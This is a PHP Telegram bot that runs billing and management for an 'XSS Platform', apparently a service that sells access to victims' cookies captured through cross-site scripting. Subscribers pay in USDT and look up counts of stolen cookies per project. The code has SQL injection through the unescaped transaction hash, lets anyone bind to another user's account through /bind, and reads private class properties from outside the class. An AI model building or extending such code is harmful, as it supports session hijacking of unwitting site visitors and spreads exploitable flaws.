<?php
/**
 * Telegram Bot - XSS Platform 管理
 * 功能：卡片式UI、Cookie查詢、TG驗證充值
 */
define('ROOT_PATH', dirname(__FILE__).'/..');
include(ROOT_PATH.'/init.php');

// 使用 Config 類獲取配置
$tgConfig = Config::getTelegram();
$tronConfig = Config::getTRON();

class TelegramBot {
    private $token;
    private $apiUrl = 'https://api.telegram.org/bot';
    private $adminChatId;
    private $usdtAddress;

    // 套餐配置
    private $plans = [
        'vip' => ['name' => 'VIP會員', 'price' => 30, 'projects' => 50, 'cookies' => 0],
    ];

    function __construct() {
        $tgConfig = Config::getTelegram();
        $tronConfig = Config::getTRON();
        $this->token = $tgConfig['token'];
        $this->adminChatId = $tgConfig['admin_id'];
        $this->usdtAddress = $tronConfig['address'];
    }

    function request($method, $data) {
        $url = $this->apiUrl . $this->token . '/' . $method;
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

    // 發送卡片消息
    function sendCard($chatId, $title, $text, $buttons = null) {
        $data = [
            'chat_id' => $chatId,
            'text' => $this->formatCard($title, $text),
            'parse_mode' => 'HTML',
            'reply_markup' => $buttons ? json_encode(['inline_keyboard' => $buttons]) : null
        ];
        return $this->request('sendMessage', $data);
    }

    // 格式化卡片樣式
    function formatCard($title, $content) {
        $card = "┌─────────────────────────────┐\n";
        $card .= "│ {$title}\n";
        $card .= "├─────────────────────────────┤\n";
        $card .= "│ {$content}\n";
        $card .= "└─────────────────────────────┘";
        return $card;
    }

    // 用戶綁定 TG
    function bindUser($chatId, $userId) {
        global $db;
        $db = DBConnect();
        $exists = $db->query("SELECT * FROM ".Tb('users')." WHERE id=".intval($userId))->fetch();
        if($exists) {
            $db->exec("UPDATE ".Tb('users')." SET tg_chat_id='".intval($chatId)."' WHERE id=".intval($userId));
            return true;
        }
        return false;
    }

    // 通過TG ChatId獲取用戶
    function getUserByChatId($chatId) {
        global $db;
        $db = DBConnect();
        return $db->query("SELECT * FROM ".Tb('users')." WHERE tg_chat_id='".intval($chatId)."'")->fetch();
    }

    // 查詢用戶Cookie統計
    function getUserCookieStats($userId) {
        global $db;
        $db = DBConnect();

        $projects = $db->query("SELECT id, name FROM ".Tb('project')." WHERE userId=".intval($userId))->fetchAll();
        $totalCookies = 0;
        $projectList = [];

        foreach($projects as $p) {
            $count = $db->query("SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId={$p['id']}")->fetchColumn();
            $totalCookies += $count;
            $projectList[] = "• {$p['name']}: {$count} 個";
        }

        return [
            'total' => $totalCookies,
            'projects' => $projectList,
            'projectCount' => count($projects)
        ];
    }

    // 查詢用戶訂閱狀態
    function getUserSubscription($userId) {
        global $db;
        $db = DBConnect();
        $sub = $db->query("SELECT * FROM ".Tb('user_subscriptions')." WHERE userId=".intval($userId))->fetch();

        if($sub && $sub['expire_time'] > time()) {
            $plan = $this->plans[$sub['plan_key']] ?? ['name' => '未知'];
            return [
                'active' => true,
                'plan' => $plan['name'],
                'expire' => date('Y-m-d', $sub['expire_time']),
                'projects' => $sub['max_projects'],
                'cookies' => $sub['max_cookies_per_day']
            ];
        }
        return ['active' => false];
    }

    // 驗證充值並開通訂閱
    function verifyPayment($chatId, $txHash, $amount) {
        global $db;
        $tronConfig = Config::getTRON();

        // 查詢 TRON 交易
        $url = $tronConfig['api_url'] . "/v1/transactions/{$txHash}/info";
        $headers = [];
        if(!empty($tronConfig['api_key'])) {
            $headers[] = 'TRON-Pro-API-Key: ' . $tronConfig['api_key'];
        }

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $response = curl_exec($ch);
        curl_close($ch);
        $tx = json_decode($response, true);

        if(!$tx || !isset($tx['confirmed'])) {
            return ['success' => false, 'msg' => '❌ 交易不存在或未確認'];
        }

        if($tx['confirmed'] !== true) {
            return ['success' => false, 'msg' => '⏳ 交易待確認中...'];
        }

        // 驗證金額和地址
        $received = false;
        if(isset($tx['transfers'])) {
            foreach($tx['transfers'] as $transfer) {
                if($transfer['to'] === $this->usdtAddress && $transfer['amount'] >= $amount * 1000000) {
                    $received = true;
                    break;
                }
            }
        }

        if(!$received) {
            return ['success' => false, 'msg' => '❌ 未收到款項或金額不足'];
        }

        // 根據金額自動匹配套餐
        $plan = null;
        foreach($this->plans as $key => $p) {
            if($p['price'] == $amount) {
                $plan = $key;
                break;
            }
        }

        if(!$plan) {
            return ['success' => false, 'msg' => '❌ 金額不匹配任何套餐'];
        }

        // 創建訂單並開通
        $db = DBConnect();
        $orderId = 'ORD'.date('YmdHis').rand(1000,9999);
        $db->exec("INSERT INTO ".Tb('payment_orders')."
            (orderId, userId, plan, amount, txHash, status, addTime, confirmTime)
            VALUES ('{$orderId}', 0, '{$plan}', {$amount}, '{$txHash}', 'confirmed', ".time().", ".time().")");

        return ['success' => true, 'orderId' => $orderId, 'plan' => $plan];
    }

    // 用戶通過TG發起充值驗證
    function startPaymentVerify($chatId, $amount, $txHash) {
        $user = $this->getUserByChatId($chatId);
        if(!$user) {
            return "❌ 請先綁定帳號：\n輸入 /bind [用戶ID] 進行綁定";
        }

        $result = $this->verifyPayment($chatId, $txHash, $amount);

        if($result['success']) {
            global $db;
            $db = DBConnect();

            // 開通用戶訂閱
            $expireTime = time() + 2592000; // 30天
            $p = $this->plans[$result['plan']];
            $db->exec("REPLACE INTO ".Tb('user_subscriptions')."
                (userId, plan_key, max_projects, max_cookies_per_day, expire_time, created_at)
                VALUES ({$user['id']}, '{$result['plan']}', {$p['projects']}, {$p['cookies']}, {$expireTime}, ".time().")");

            // 更新用戶VIP狀態
            $db->exec("UPDATE ".Tb('users')." SET vip_level='{$result['plan']}', vip_expire={$expireTime} WHERE id={$user['id']}");

            return "✅ <b>充值成功！</b>\n\n".
                "套餐：{$p['name']}\n".
                "訂單號：{$result['orderId']}\n".
                "到期時間：".date('Y-m-d', $expireTime);
        }

        return $result['msg'];
    }

    // 生成充值按鈕
    function getPaymentButtons() {
        return [
            [
                ['text' => "💰 充值 VIP (\$30/月)", 'callback_data' => "pay_vip"]
            ],
            [
                ['text' => "🔍 查詢充值", 'callback_data' => "query_pay"],
                ['text' => "📊 Cookie統計", 'callback_data' => "cookie_stats"]
            ],
            [
                ['text' => "💳 訂閱狀態", 'callback_data' => "sub_status"]
            ]
        ];
    }
}

// Webhook 處理
if(php_sapi_name() == 'cli') exit();

$content = file_get_contents('php://input');
$update = json_decode($content, true);
$bot = new TelegramBot();

// 回調按鈕處理
if($update['callback_query']) {
    $chatId = $update['callback_query']['from']['id'];
    $data = $update['callback_query']['data'];
    $user = $bot->getUserByChatId($chatId);

    if(strpos($data, 'pay_') === 0) {
        $planKey = str_replace('pay_', '', $data);
        $p = $bot->plans[$planKey];
        $bot->sendCard($chatId, "💳 充值 {$p['name']}",
            "金額：\${$p['price']} USDT\n\n".
            "轉帳地址：\n<code>{$bot->usdtAddress}</code>\n\n".
            "轉帳後請輸入：\n/pay [交易Hash]\n\n例如：\n/pay abc123def456",
            [['text' => "🔙 返回", 'callback_data' => 'main_menu']]);
    }
    elseif($data === 'query_pay') {
        $bot->sendCard($chatId, "🔍 查詢充值",
            "請輸入 /pay [txHash]\n\n例如：\n/pay abc123def456",
            [['text' => "🔙 返回", 'callback_data' => 'main_menu']]);
    }
    elseif($data === 'cookie_stats') {
        if(!$user) {
            $bot->sendCard($chatId, "❌ 未綁定", "請先輸入 /bind [用戶ID] 綁定帳號", [['text' => "🔙 返回", 'callback_data' => 'main_menu']]);
        } else {
            $stats = $bot->getUserCookieStats($user['id']);
            $bot->sendCard($chatId, "🍪 Cookie 統計",
                "總計：{$stats['total']} 個\n".
                "項目數：{$stats['projectCount']}\n\n".
                "<b>項目詳情：</b>\n".implode("\n", array_slice($stats['projects'], 0, 10)),
                [['text' => "🔙 返回", 'callback_data' => 'main_menu']]);
        }
    }
    elseif($data === 'sub_status') {
        if(!$user) {
            $bot->sendCard($chatId, "❌ 未綁定", "請先輸入 /bind [用戶ID] 綁定帳號", [['text' => "🔙 返回", 'callback_data' => 'main_menu']]);
        } else {
            $sub = $bot->getUserSubscription($user['id']);
            if($sub['active']) {
                $bot->sendCard($chatId, "💳 訂閱狀態",
                    "狀態：✅ 已激活\n".
                    "套餐：{$sub['plan']}\n".
                    "項目限額：{$sub['projects']}\n".
                    "Cookie限額：{$sub['cookies']}\n".
                    "到期時間：{$sub['expire']}",
                    [['text' => "🔙 返回", 'callback_data' => 'main_menu']]);
            } else {
                $bot->sendCard($chatId, "💳 訂閱狀態",
                    "狀態：❌ 未開通\n\n".
                    "VIP會員：\$30/月\n".
                    "• 50 個項目\n".
                    "• 無限 Cookie",
                    [['text' => "🔙 返回", 'callback_data' => 'main_menu']]);
            }
        }
    }
    elseif($data === 'main_menu') {
        $bot->sendCard($chatId, "🔰 XSS Platform",
            "歡迎使用管理機器人\n\n請選擇操作：",
            $bot->getPaymentButtons());
    }
}

// 普通消息處理
if($update['message']) {
    $chatId = $update['message']['from']['id'];
    $text = $update['message']['text'];

    // /start
    if(strpos($text, '/start') === 0) {
        $bot->sendCard($chatId, "🔰 XSS Platform Bot",
            "歡迎使用！\n\n<b>可用命令：</b>\n".
            "• /bind [用戶ID] - 綁定帳號\n".
            "• /stats - Cookie統計\n".
            "• /sub - 訂閱狀態\n".
            "• /pay [txHash] - 充值驗證\n\n".
            "或者點擊下方按鈕操作：",
            $bot->getPaymentButtons());
    }

    // /bind [用戶ID]
    elseif(strpos($text, '/bind') === 0) {
        $userId = trim(str_replace('/bind', '', $text));
        if($bot->bindUser($chatId, $userId)) {
            $bot->sendCard($chatId, "✅ 綁定成功", "用戶ID：{$userId}\n\n現在可以查詢Cookie和充值了！");
        } else {
            $bot->sendCard($chatId, "❌ 綁定失敗", "用戶ID不存在，請確認後重試");
        }
    }

    // /stats - Cookie統計
    elseif(strpos($text, '/stats') === 0) {
        $user = $bot->getUserByChatId($chatId);
        if(!$user) {
            $bot->sendCard($chatId, "❌ 未綁定", "請先輸入 /bind [用戶ID] 綁定帳號");
        } else {
            $stats = $bot->getUserCookieStats($user['id']);
            $bot->sendCard($chatId, "🍪 Cookie 統計",
                "總計：{$stats['total']} 個\n".
                "項目數：{$stats['projectCount']}\n\n".
                "<b>項目詳情：</b>\n".implode("\n", array_slice($stats['projects'], 0, 10)));
        }
    }

    // /sub - 訂閱狀態
    elseif(strpos($text, '/sub') === 0) {
        $user = $bot->getUserByChatId($chatId);
        if(!$user) {
            $bot->sendCard($chatId, "❌ 未綁定", "請先輸入 /bind [用戶ID] 綁定帳號");
        } else {
            $sub = $bot->getUserSubscription($user['id']);
            if($sub['active']) {
                $bot->sendCard($chatId, "💳 訂閱狀態",
                    "狀態：✅ 已激活\n".
                    "套餐：{$sub['plan']}\n".
                    "項目限額：{$sub['projects']}\n".
                    "Cookie限額：{$sub['cookies']}\n".
                    "到期時間：{$sub['expire']}");
            } else {
                $bot->sendCard($chatId, "💳 訂閱狀態",
                    "狀態：❌ 未開通\n\n".
                    "請輸入 /pay [txHash] 進行充值");
            }
        }
    }

    // /pay [txHash] - 充值驗證
    elseif(strpos($text, '/pay') === 0) {
        $txHash = trim(str_replace('/pay', '', $text));
        if(strlen($txHash) < 10) {
            $bot->sendCard($chatId, "❌ 格式錯誤",
                "正確格式：\n/pay [交易Hash]\n\n例如：\n/pay abc123def456");
        } else {
            $result = $bot->startPaymentVerify($chatId, 30, $txHash);
            $bot->sendCard($chatId, "💰 充值結果", $result);
        }
    }

    // 未知命令
    else {
        $bot->sendCard($chatId, "❓ 未知命令",
            "可用命令：\n".
            "• /start - 開始使用\n".
            "• /bind [用戶ID] - 綁定帳號\n".
            "• /stats - Cookie統計\n".
            "• /sub - 訂閱狀態\n".
            "• /pay [txHash] - 充值驗證");
    }
}
